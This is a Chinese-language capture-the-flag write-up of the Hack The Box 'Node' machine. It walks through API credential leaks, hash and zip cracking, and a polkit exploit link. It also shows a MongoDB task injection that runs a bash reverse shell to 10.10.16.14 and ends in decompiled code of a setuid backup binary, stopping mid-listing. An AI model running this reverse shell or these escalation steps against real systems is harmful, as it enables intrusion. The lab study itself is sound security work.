---
# Documentation: https://wowchemy.com/docs/managing-content/

title: "Node"
linktitle: "Node"
date: 2022-07-25T15:35:40+08:00
type: book
summary: ""
test: 
---



### nmap端口识别

```bash
nmap -A 10.10.10.58
```

![](image/image_7LyGX5L7DI.png)

3000端口

在http\://10.10.10.58:3000/api/users/latest 发现了哈希密码

![](image/image_JRxwq0WDr8.png)

请求响应头`X-Powered-By: Express` 知道是nodejs框架

这里有个不太懂的特性，记录一下

**==============================================================**

请求头`If-None-Match`的值需要修改才能查看到返回包，不然直接返回`HTTP/1.1 304 Not Modified`

不知道是不是nodejs特性

![](image/image_CPVolIWHK7.png)

![](image/image_vymm200Neb.png)

If-None-Match定义

<https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-None-Match>

**==============================================================**

回到题目，哈希在线解密

<https://crackstation.net/>

![](image/image_xaYsBoimEw.png)

得到两个web密码

```bash
tom/spongebob
mark/snowflake

```

显示只有admin有面板权限

![](image/image_VgoCxWPh0d.png)

这里面什么都没有，后来通过访问一个用户信息的链接

```bash
http://10.10.10.58:3000/api/users/mark
```

返回了用户的个人账号信息

![](image/image_YlzoUMz_0K.png)

当你回退一级目录，发现存在用户的信息遍历

```bash
http://10.10.10.58:3000/api/users/
```

发现了一个新的用户，并且是管理员

![](image/image_Z9RrYHN4CO.png)

![](image/image_fgGCFy1F6b.png)

#### 得到web账号密码

```bash
myP14ceAdm1nAcc0uNT/manchester
```

可以下载备份文件

![](image/image_YY9uiG--0c.png)

```bash
# file myplace.backup                               
myplace.backup: ASCII text, with very long lines (65536), with no line terminators

```

查看文本发现是base64

![](image/image_k6JznOjmwk.png)

解码后发现是zip压缩包

```bash
┌──(root㉿kali)-[/home/kali/hackbox/Node]
└─# cat myplace.backup|base64 -d>myplace.backup.decode
                                                                               
┌──(root㉿kali)-[/home/kali/hackbox/Node]
└─# file myplace.backup.decode 
myplace.backup.decode: Zip archive data, at least v1.0 to extract, compression method=store
```

解压需要密码

```bash
┌──(root㉿kali)-[/home/kali/hackbox/Node]
└─# unzip myplace.backup.zip 
Archive:  myplace.backup.zip
   creating: var/www/myplace/
[myplace.backup.zip] var/www/myplace/package-lock.json password: 

```

fcrackzip工具枚举得到密码

```bash
┌──(root㉿kali)-[/home/kali/hackbox/Node]
└─# fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u ./myplace.backup.zip 


PASSWORD FOUND!!!!: pw == magicword

```

![](image/image_zvZsmZtto3.png)

### 通过app.js发现了 mark ssh登录密码`5AYRft73VtFpc84k`

mongodb标准 URI 连接语法：

```bash
mongodb://[username:password@]host1[:port1][,host2[:port2],...[,hostN[:portN]]][/[database][?options]]
```

![](image/image_Pu5_ykCiIm.png)

ssh mark

![](image/image_c-lKXm-O5G.png)

### polkit提权一步到位：

\===============================================================

简单一点直接polkit提权` CVE-2021-4034` 到root

<https://github.com/dadvlingd/-CVE-2021-4034>

![](image/image_-L17SGBxsc.png)

\===============================================================

### 常规提权：

因为`mark`没权限读flag，所以要先提权到`tom`，再提权到`root`才能拿到

![](image/image_jIc3CAXsqF.png)

#### 提权到tom

```bash
ps -auxww
```

只有两个进程是tom运行的

```bash
/usr/bin/node /var/www/myplace/app.js
/usr/bin/node /var/scheduler/app.js

```

![](image/image_suudpbb_em.png)

/var/scheduler/app.js

```javascript
const exec        = require('child_process').exec;
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';

MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }

  setInterval(function () {
    db.collection('tasks').find().toArray(function (error, docs) {
      if (!error && docs) {
        docs.forEach(function (doc) {
          if (doc) {
            console.log('Executing task ' + doc._id + '...');
            exec(doc.cmd);
            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
          }
        });
      }
      else if (error) {
        console.log('Something went wrong: ' + error);
      }
    });
  }, 30000);

});

```

该脚本连接mongo的scheduler数据库，每30秒执行一次。

代码解读：

```bash
1.从tasks集合(类似sql中的表)中取出字符，
2.将每个字符传递给exec()执行命令,然后删除这个字符
3.30秒后再循环执行。
```

那么只要修改`mongo`数据库对应的文档(字段)为`exp`，然后`tom`用户自动执行/var/scheduler/app.js去读取`mongo`被修改的文档，执行命令反弹`tom shell`即可提权成功

执行过程如下：

```bash
mark@node:/home/tom$ mongo -u mark -p 5AYRft73VtFpc84k scheduler

show collections

db.tasks.find()

db.tasks.insert({"cmd": "bash -c 'bash -i >& /dev/tcp/10.10.16.14/2333 0>&1'"})


```

![](image/image_h23tlwJCDg.png)

30秒后监听的端口收到shell，成功提权到`tom`

![](image/image_j0yJ32N9yS.png)

#### 提权到root

看了下group组，发现`root`居然属于`admin`组

![](image/image_rRCsMLVHVu.png)

/etc/group字段解析

<https://blog.51cto.com/dlican/3741615>

发现只有`/usr/local/bin/backup`文件属于`admin`组

![](image/image_4QRfUTI-Dl.png)

`/usr/local/bin/backup`是32位二进制可执行文件

```bash
tom@node:/$ file /usr/local/bin/backup
/usr/local/bin/backup: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=343cf2d93fb2905848a42007439494a2b4984369, not stripped
```

通过查找运行的nodejs代码，发现`/var/www/myplace/app.js`调用了`/usr/local/bin/backup`

```bash
find / -name '*.js' 2>/dev/null|xargs grep '/usr/local/bin/backup'
```

![](image/image_Vnc-dcLcIN.png)

通过`/var/www/myplace/app.js`得知`/usr/local/bin/backup`需要传入三位参数，

```bash
/usr/local/bin/backup -q backup_key, __dirname
```

继续分析，通过IDA反编译`/usr/local/bin/backup`得到代码

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __uid_t v3; // eax
  __pid_t v4; // esi
  time_t v5; // ebx
  clock_t v6; // eax
  unsigned int v7; // eax
  char command[1500]; // [esp+1h] [ebp-10B1h] BYREF
  char name[1000]; // [esp+5DDh] [ebp-AD5h] BYREF
  char v11[500]; // [esp+9C5h] [ebp-6EDh] BYREF
  char s[1000]; // [esp+BB9h] [ebp-4F9h] BYREF
  char filename[100]; // [esp+FA1h] [ebp-111h] BYREF
  char v14[6]; // [esp+1005h] [ebp-ADh] BYREF
  char v15[3]; // [esp+100Bh] [ebp-A7h] BYREF
  _BYTE v16[6]; // [esp+100Eh] [ebp-A4h] BYREF
  char v17[6]; // [esp+1014h] [ebp-9Eh] BYREF
  char v18[6]; // [esp+101Ah] [ebp-98h] BYREF
  char src[2]; // [esp+1020h] [ebp-92h] BYREF
  char dest[100]; // [esp+1022h] [ebp-90h] BYREF
  int v21; // [esp+1086h] [ebp-2Ch]
  FILE *stream; // [esp+108Ah] [ebp-28h]
  int i; // [esp+108Eh] [ebp-24h]
  int v24; // [esp+1092h] [ebp-20h]
  int v25; // [esp+1096h] [ebp-1Ch]
  int *p_argc; // [esp+10A2h] [ebp-10h]

  p_argc = &argc;
  v3 = geteuid();
  setuid(v3);
  v25 = 0;
  v24 = 0;
  if ( argc <= 3 )
    exit(1);
  if ( strcmp(argv[1], "-q") )
  {
    v24 = 1;
    puts("\n\n\n             ____________________________________________________");
    puts("            /                                                    \\");
    puts("           |    _____________________________________________     |");
    puts("           |   |                                             |    |");
    puts("           |   |                                             |    |");
    puts("           |   |                                             |    |");
    puts("           |   |                                             |    |");
    puts("           |   |                                             |    |");
    puts("           |   |                                             |    |");
    puts("           |   |             Secure Backup v1.0              |    |");
    puts("           |   |                                             |    |");
    puts("           |   |                                             |    |");
    puts("           |   |                                             |    |");
    puts("           |   |                                             |    |");
    puts("           |   |                                             |    |");
    puts("           |   |                                             |    |");
    puts("           |   |_____________________________________________|    |");
    puts("           |                                                      |");
    puts("            \\_____________________________________________________/");
    puts("                   \\_______________________________________/");
    puts("                _______________________________________________");
    puts("             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_");
    puts("          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_");
    puts("       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_");
    puts("    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_");
    puts(" _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_");
    puts(":-----------------------------------------------------------------------------:");
    puts("`---._.-----------------------------------------------------------------._.---'\n\n");
  }
  strncpy(dest, argv[2], 0x64u);
  strcpy(src, "/");
  strcpy(v14, "/e");
  strcpy(&v14[3], "tc");
  strcpy(v15, src);
  *(_WORD *)&v15[strlen(v15)] = 109;
  strcpy(v16, "yp");
  strcpy(&v16[3], "la");
  strcpy(v17, "ce");
  strcpy(&v17[3], src);
  *(_WORD *)&v17[strlen(&v17[3]) + 3] = 107;
  strcpy(v18, "ey");
  strcpy(&v18[3], "s");
  strcpy(filename, v14);
  for ( i = 1; i <= 8; ++i )
    strcat(filename, &v14[3 * i]);
  stream = fopen(filename, "r");
  if ( !stream )
  {
    if ( v24 == 1 )
      displayWarning("Could not open file\n\n");
    exit(1);
  }
  while ( fgets(s, 1000, stream) )
  {
    s[strcspn(s, "\n")] = 0;
    if ( !strcmp(dest, s) )
    {
      v25 = 1;
      if ( v24 == 1 )
        displaySuccess("Validated access token");
    }
  }
  if ( v25 != 1 )
  {
    if ( v24 == 1 )
      displayWarning("Ah-ah-ah! You didn't say the magic word!\n\n");
    exit(1);
  }
  if ( strstr(argv[3], "..") )
  {
    displaySuccess("Finished! Encoded backup is below:\n");
    puts(
      "UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpS"
      "vYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZor"
      "Y67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207Ef"
      "D3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2"
      "EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/"
      "a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MM"
      "yU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut2"
      "2WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd2"
      "6PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJr"
      "yLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOx"
      "kDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmP"
      "aFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnict"
      "zNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBw"
      "ACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==");
    exit(0);
  }
  if ( strstr(argv[3], "/root") )
  {
    displaySuccess("Finished! Encoded backup is below:\n");
    puts(
      "UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpS"
      "vYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZor"
      "Y67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207Ef"
      "D3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2"
      "EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/"
      "a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MM"
      "yU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut2"
      "2WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd2"
      "6PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJr"
      "yLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOx"
      "kDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmP"
      "aFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnict"
      "zNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBw"
      "ACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==");
    exit(0);
  }
  if ( strchr(argv[3], 59) )
  {
    displaySuccess("Finished! Encoded backup is below:\n");
    puts(
      "UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpS"
      "vYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZor"
      "Y67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207Ef"
      "D3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2"
      "EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/"
      "a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MM"
      "yU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut2"
      "2WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd2"
      "6PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJr"
      "yLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOx"
      "kDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmP"
      "aFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnict"
      "zNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBw"
      "ACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==");
    exit(0);
  }
  if ( strchr(argv[3], 38) )
  {
    displaySuccess("Finished! Encoded backup is below:\n");
    puts(
      "UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpS"
      "vYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZor"
      "Y67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207Ef"
      "D3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2"
      "EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/"
      "a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MM"
      "yU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut2"
      "2WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd2"
      "6PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJr"
      "yLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOx"
      "kDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmP"
      "aFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnict"
      "zNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBw"
      "ACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==");
    exit(0);
  }
  if ( strchr(argv[3], 96) )
  {
    displaySuccess("Finished! Encoded backup is below:\n");
    puts(
      "UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpS"
      "vYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZor"
      "Y67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207Ef"
      "D3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2"
      "EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/"
      "a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MM"
      "yU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut2"
      "2WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd2"
      "6PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJr"
      "yLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOx"
      "kDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmP"
      "aFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnict"
      "zNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBw"
      "ACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==");
    exit(0);
  }
  if ( strchr(argv[3], 36) )
  {
    displaySuccess("Finished! Encoded backup is below:\n");
    puts(
      "UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpS"
      "vYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZor"
      "Y67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207Ef"
      "D3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2"
      "EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/"
      "a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MM"
      "yU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut2"
      "2WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd2"
      "6PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJr"
      "yLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOx"
      "kDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmP"
      "aFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnict"
      "zNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBw"
      "ACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==");
    exit(0);
  }
  if ( strchr(argv[3], 124) )
  {
    displaySuccess("Finished! Encoded backup is below:\n");
    puts(
      "UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpS"
      "vYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZor"
      "Y67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207Ef"
      "D3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2"
      "EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/"
